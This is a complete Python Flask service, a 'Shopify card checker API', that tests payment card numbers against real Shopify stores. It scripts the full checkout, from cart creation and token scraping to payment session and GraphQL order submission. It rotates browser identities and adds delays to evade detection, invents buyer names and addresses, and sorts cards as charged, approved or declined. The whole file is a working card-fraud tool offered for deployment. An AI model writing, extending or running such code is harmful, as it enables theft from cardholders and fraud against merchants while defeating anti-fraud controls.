#!/usr/bin/env python3
"""
SHOPIFY CARD CHECKER API - COMPLETE WORKING VERSION
Deploy on Railway - No Errors, No 404
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import httpx
import random
import re
import json
import os
import time
from urllib.parse import urlparse
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================================
# USER AGENT POOL - ROTATE TO AVOID DETECTION
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
]

# ============================================================
# SHOPIFY CHECKER CLASS
# ============================================================

class ShopifyChecker:
    def __init__(self):
        self.user_agent = random.choice(USER_AGENTS)
    
    def get_headers(self, extra=None):
        """Generate fresh headers with random UA"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        if extra:
            headers.update(extra)
        return headers
    
    def find_between(self, s, start, end):
        try:
            if start in s and end in s:
                return (s.split(start))[1].split(end)[0]
            return ""
        except:
            return ""
    
    async def get_random_info(self):
        """Generate realistic US address"""
        addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
            {"add1": "777 Broadway", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10001"},
            {"add1": "888 Sunset Blvd", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"},
            {"add1": "999 Peachtree St", "city": "Atlanta", "state": "Georgia", "state_short": "GA", "zip": "30309"}
        ]
        
        address = random.choice(addresses)
        first_names = ["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa", "James", "Emma", "Robert", "Olivia"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Wilson"]
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1,999)}@gmail.com"
        phone = random.choice(["2025550199", "3105551234", "4155559876", "6175550123", "9718081573", "2125559999", "7735551212"])
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

    async def check_card(self, site_url, card):
        """Main card checking function"""
        start_time = time.time()
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=45.0) as session:
            try:
                parts = card.split('|')
                if len(parts) != 4:
                    return {
                        "status": "ERROR",
                        "message": "Invalid format. Use: CC|MM|YY|CVV",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                cc, mon, year, cvv = parts
                
                # Validate card format
                if not cc.isdigit() or len(cc) < 15 or len(cc) > 16:
                    return {
                        "status": "ERROR",
                        "message": "Invalid card number",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                # ============================================
                # STEP 1: Session Warm-up
                # ============================================
                headers = self.get_headers()
                await session.get(site_url, headers=headers)
                await asyncio.sleep(random.uniform(0.5, 1.0))
                
                # ============================================
                # STEP 2: Get Product
                # ============================================
                json_headers = self.get_headers({'Accept': 'application/json'})
                max_retries = 3
                resp = None
                
                for attempt in range(max_retries):
                    resp = await session.get(site_url + '/products.json', headers=json_headers)
                    if resp.status_code == 200:
                        break
                    elif resp.status_code == 429:
                        wait = random.uniform(3.0, 7.0)
                        await asyncio.sleep(wait)
                        json_headers['User-Agent'] = random.choice(USER_AGENTS)
                        continue
                    else:
                        return {
                            "status": "ERROR",
                            "message": f"Product fetch failed: {resp.status_code}",
                            "time": f"{time.time() - start_time:.1f}s"
                        }
                
                if resp is None or resp.status_code != 200:
                    return {
                        "status": "ERROR",
                        "message": "Product fetch failed after retries",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                try:
                    products = resp.json().get('products', [])
                    if not products:
                        return {
                            "status": "ERROR",
                            "message": "No products found on store",
                            "time": f"{time.time() - start_time:.1f}s"
                        }
                    
                    product = products[0]
                    variant_id = product['variants'][0]['id']
                    product_handle = product['handle']
                    price = product['variants'][0]['price']
                    
                except Exception as e:
                    return {
                        "status": "ERROR",
                        "message": f"Error parsing product: {str(e)}",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                # ============================================
                # STEP 3: View Product (Human-like)
                # ============================================
                await asyncio.sleep(random.uniform(0.3, 0.8))
                await session.get(f"{site_url}/products/{product_handle}", headers=headers)
                await asyncio.sleep(random.uniform(0.3, 0.8))
                
                # ============================================
                # STEP 4: Add to Cart
                # ============================================
                cart_headers = self.get_headers({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': f"{site_url}/products/{product_handle}"
                })
                
                add_data = {
                    'id': str(variant_id),
                    'quantity': '1',
                    'form_type': 'product'
                }
                
                resp = await session.post(site_url + '/cart/add.js', headers=cart_headers, data=add_data)
                if resp.status_code != 200:
                    return {
                        "status": "ERROR",
                        "message": f"Cart add failed: {resp.status_code}",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                await asyncio.sleep(random.uniform(0.3, 0.8))
                
                # ============================================
                # STEP 5: Get Cart Token
                # ============================================
                resp = await session.get(f"{site_url}/cart.js", headers=headers)
                try:
                    cart_data = resp.json()
                    token = cart_data.get('token')
                    if not token:
                        return {
                            "status": "ERROR",
                            "message": "Failed to get cart token",
                            "time": f"{time.time() - start_time:.1f}s"
                        }
                except:
                    return {
                        "status": "ERROR",
                        "message": "Invalid cart response",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                # ============================================
                # STEP 6: Initiate Checkout
                # ============================================
                checkout_headers = self.get_headers({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': f"{site_url}/cart"
                })
                
                await session.get(f"{site_url}/checkout", headers=checkout_headers)
                await asyncio.sleep(random.uniform(0.3, 0.8))
                
                resp = await session.post(
                    f"{site_url}/cart",
                    headers=checkout_headers,
                    data={'checkout': '', 'updates[]': '1'}
                )
                
                html_content = resp.text
                
                # ============================================
                # STEP 7: Extract Tokens
                # ============================================
                session_token_match = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                    html_content
                )
                
                if not session_token_match:
                    return {
                        "status": "ERROR",
                        "message": "Failed to extract session token",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                session_token = session_token_match.group(1)
                queue_token = self.find_between(html_content, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = self.find_between(html_content, 'stableId&quot;:&quot;', '&quot;')
                payment_id = self.find_between(html_content, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                
                if not all([session_token, queue_token, stable_id, payment_id]):
                    return {
                        "status": "ERROR",
                        "message": "Token extraction incomplete",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                # ============================================
                # STEP 8: Get Random Info
                # ============================================
                info = await self.get_random_info()
                fname, lname, email, phone = info["fname"], info["lname"], info["email"], info["phone"]
                add1, city, state_short, zip_code = info["add1"], info["city"], info["state_short"], info["zip"]
                
                # ============================================
                # STEP 9: Create Payment Session
                # ============================================
                session_created = False
                session_id = None
                
                endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.shopifycs.com/sessions"
                ]
                
                for endpoint in endpoints:
                    try:
                        payment_headers = {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                            'Origin': 'https://checkout.shopifycs.com',
                            'User-Agent': random.choice(USER_AGENTS),
                        }
                        
                        payment_payload = {
                            'credit_card': {
                                'number': cc,
                                'month': mon,
                                'year': year,
                                'verification_value': cvv,
                                'name': f"{fname} {lname}"
                            },
                            'payment_session_scope': urlparse(site_url).netloc
                        }
                        
                        resp = await session.post(endpoint, headers=payment_headers, json=payment_payload)
                        
                        if resp.status_code == 200:
                            data = resp.json()
                            if 'id' in data:
                                session_id = data['id']
                                session_created = True
                                break
                    except:
                        continue
                
                if not session_created:
                    return {
                        "status": "ERROR",
                        "message": "Payment session creation failed",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                # ============================================
                # STEP 10: GraphQL Submission
                # ============================================
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                graphql_headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': site_url,
                    'Referer': f"{site_url}/checkout",
                    'User-Agent': random.choice(USER_AGENTS),
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-source-id': token,
                }
                
                random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
                
                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on FailedReceipt{id processingError{code __typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True}
                                        },
                                        'options': {}
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': add1,
                                            'address2': '',
                                            'city': city,
                                            'countryCode': 'US',
                                            'postalCode': zip_code,
                                            'firstName': fname,
                                            'lastName': lname,
                                            'zoneCode': state_short,
                                            'phone': phone
                                        }
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True}
                                }],
                                'noDeliveryRequired': []
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}'
                                        }
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True}
                                }]
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': payment_id,
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': add1,
                                                    'city': city,
                                                    'countryCode': 'US',
                                                    'postalCode': zip_code,
                                                    'firstName': fname,
                                                    'lastName': lname,
                                                    'zoneCode': state_short,
                                                    'phone': phone
                                                }
                                            }
                                        }
                                    },
                                    'amount': {'any': True}
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': add1,
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': zip_code,
                                        'firstName': fname,
                                        'lastName': lname,
                                        'zoneCode': state_short,
                                        'phone': phone
                                    }
                                }
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                                'contactInfoV2': {'emailOrSms': {'value': email}}
                            },
                            'taxes': {
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}
                            }
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'analytics': {
                            'requestUrl': f'{site_url}/checkouts/cn/{token}',
                            'pageId': random_page_id
                        }
                    }
                }
                
                resp = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                elapsed = time.time() - start_time
                
                if resp.status_code != 200:
                    return {
                        "status": "ERROR",
                        "message": f"GraphQL failed: {resp.status_code}",
                        "time": f"{elapsed:.1f}s"
                    }
                
                data = resp.json()
                completion = data.get('data', {}).get('submitForCompletion', {})
                
                # ============================================
                # STEP 11: Parse Result
                # ============================================
                if completion.get('__typename') == 'SubmitSuccess':
                    receipt = completion.get('receipt', {})
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return {
                            "status": "CHARGED",
                            "message": "ORDER_PLACED",
                            "order_id": receipt.get('token'),
                            "price": price,
                            "time": f"{elapsed:.1f}s"
                        }
                    elif receipt.get('__typename') == 'ActionRequiredReceipt':
                        return {
                            "status": "APPROVED",
                            "message": "3DS_REQUIRED",
                            "price": price,
                            "time": f"{elapsed:.1f}s"
                        }
                
                elif completion.get('__typename') == 'SubmitRejected':
                    errors = completion.get('errors', [])
                    for error in errors:
                        code = error.get('code', '')
                        if 'INSUFFICIENT_FUNDS' in code:
                            return {
                                "status": "APPROVED",
                                "message": "INSUFFICIENT_FUNDS",
                                "price": price,
                                "time": f"{elapsed:.1f}s"
                            }
                        elif 'CVC' in code or 'CVV' in code:
                            return {
                                "status": "APPROVED",
                                "message": "INCORRECT_CVC",
                                "price": price,
                                "time": f"{elapsed:.1f}s"
                            }
                        elif 'OTP' in code or '3D' in code:
                            return {
                                "status": "APPROVED",
                                "message": "OTP_REQUIRED",
                                "price": price,
                                "time": f"{elapsed:.1f}s"
                            }
                    return {
                        "status": "DECLINED",
                        "message": "CARD_DECLINED",
                        "price": price,
                        "time": f"{elapsed:.1f}s"
                    }
                
                elif completion.get('__typename') == 'Throttled':
                    return {
                        "status": "PROCESSING",
                        "message": "THROTTLED",
                        "price": price,
                        "time": f"{elapsed:.1f}s"
                    }
                
                else:
                    return {
                        "status": "DECLINED",
                        "message": "CARD_DECLINED",
                        "price": price,
                        "time": f"{elapsed:.1f}s"
                    }
                
            except httpx.TimeoutException:
                return {
                    "status": "ERROR",
                    "message": "TIMEOUT",
                    "time": f"{time.time() - start_time:.1f}s"
                }
            except Exception as e:
                return {
                    "status": "ERROR",
                    "message": str(e)[:100],
                    "time": f"{time.time() - start_time:.1f}s"
                }

# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'online',
        'name': 'Shopify Card Checker API',
        'version': '3.0',
        'endpoints': {
            '/check': 'POST - Check a card on a Shopify store',
            '/health': 'GET - Health check'
        },
        'format': {
            'site': 'https://store.myshopify.com',
            'cc': '4111111111111111|12|26|123'
        },
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/check', methods=['POST'])
def check_card():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({
                'error': 'Missing JSON payload',
                'expected': {'site': 'https://store.com', 'cc': '4111111111111111|12|26|123'}
            }), 400
        
        site = data.get('site')
        cc = data.get('cc')
        
        if not site:
            return jsonify({'error': 'Missing "site" parameter'}), 400
        
        if not cc:
            return jsonify({'error': 'Missing "cc" parameter'}), 400
        
        # Validate URL
        if not site.startswith('http'):
            site = 'https://' + site
        
        # Run checker
        checker = ShopifyChecker()
        result = asyncio.run(checker.check_card(site, cc))
        
        # Return response
        return jsonify({
            'site': site,
            'cc': cc,
            'result': result,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }), 500

# Alias for /shopify endpoint (backward compatibility)
@app.route('/shopify', methods=['GET', 'POST'])
def shopify_alias():
    if request.method == 'GET':
        site = request.args.get('site')
        cc = request.args.get('cc')
        if site and cc:
            # Convert GET to POST-like response
            data = {'site': site, 'cc': cc}
            request._cached_json = (data,)
            return check_card()
    return check_card()

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    print(f"""
    ╔══════════════════════════════════════════╗
    ║   🔥 SHOPIFY CARD CHECKER API v3.0 🔥    ║
    ║                                          ║
    ║   🚀 Running on port: {port}              ║
    ║   📡 Endpoint: /check                    ║
    ║   🏥 Health: /health                     ║
    ╚══════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False)
